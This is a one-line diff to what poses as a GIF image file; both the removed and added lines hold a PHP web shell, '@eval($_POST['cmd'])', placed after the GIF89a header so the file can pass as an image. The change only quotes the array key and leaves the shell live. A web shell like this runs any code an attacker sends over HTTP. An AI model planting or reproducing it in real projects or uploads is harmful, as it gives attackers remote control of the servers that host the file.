@@ -1,1 +1,1 @@
-GIF89a<?php @eval($_POST[cmd]); ?>
+GIF89a<?php @eval($_POST['cmd']); ?>
